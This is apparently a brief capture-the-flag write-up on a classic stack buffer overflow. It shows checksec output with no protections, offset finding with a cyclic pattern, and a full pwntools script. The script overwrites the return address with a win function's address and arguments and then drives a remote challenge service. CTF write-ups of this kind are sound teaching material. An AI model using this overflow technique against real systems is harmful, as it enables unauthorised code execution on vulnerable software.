# bof on the top

this one was just a classic bufferovflow 

we will start by examining the binary 
`checksec ./bof`

![checksec]()

nothing unique no protection no ASLR

so I just got a cyclic pattern and located the overflow
done :D

exploit code 
```
from pwn import *

p = remote("ctf.umbccd.io", 4000)
#p = process("./bof")

win = p32(0x08049182)

payload = ("A"*62).encode() + win + p32(0xdeadbeef) + p32(1200) + p32(366)

input("attach gdb")
p.recvuntil("name?")
p.sendline(payload)
p.recvuntil("singing?")
p.sendline()

data = p.recvline()
print(data.decode())
data = p.recvline()
print(data.decode())
p.interactive()
```
